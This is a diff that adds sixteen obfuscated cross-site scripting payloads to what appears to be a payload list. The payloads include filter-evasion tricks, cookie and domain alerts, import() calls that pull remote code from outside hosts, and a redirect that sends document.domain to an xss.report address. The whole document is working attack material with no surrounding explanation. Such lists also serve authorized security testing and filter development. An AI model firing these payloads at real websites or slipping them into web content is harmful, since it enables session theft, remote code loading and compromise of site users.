@@ -2845,3 +2845,19 @@ www.meteoprog.ua
 </<Kno XSS="><Svg Onload=alert(1)>
 <!<K><Svg Onload=alert(1)>
 <!<Kno XSS="><Svg Onload=alert(1)>
+<img//////src=x oNlY=1 oNerror=alert(document.cookie)(import(/https:\\http://X55.is/?1=18369/.sour69/.source))//>
+'/*\'/*"/*\"/*</Script><Input/AutoFocus/OnFocus=alert(1)/**/(import(/https:\\http://X55.is/?1=18369/.sour69/.source))//>
+1%27/prompt?.(1)/%27
+<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;> 
+<x onauxclick=import('//1152848220/')>
+"*prompt(document.domain)*"
+<x onauxclick=a=alert,a(domain)>
+<x onauxclick=import('//xss/')>
+<svg on =i onload=alert(domain)
+<svg/onload=location/**/='https://xss.report/c/department'+document.domain>
+<svg onx=() onload=window.alert?.()>
+%27%09);%0d%0a%09%09[1].find(alert)
+<x/onclick=globalThis&lsqb;'\u0070r\u006f'+'mpt']&lt;)>
+tarun"><x/onafterscriptexecute=confirm%26lpar;)
+<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />
+<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>
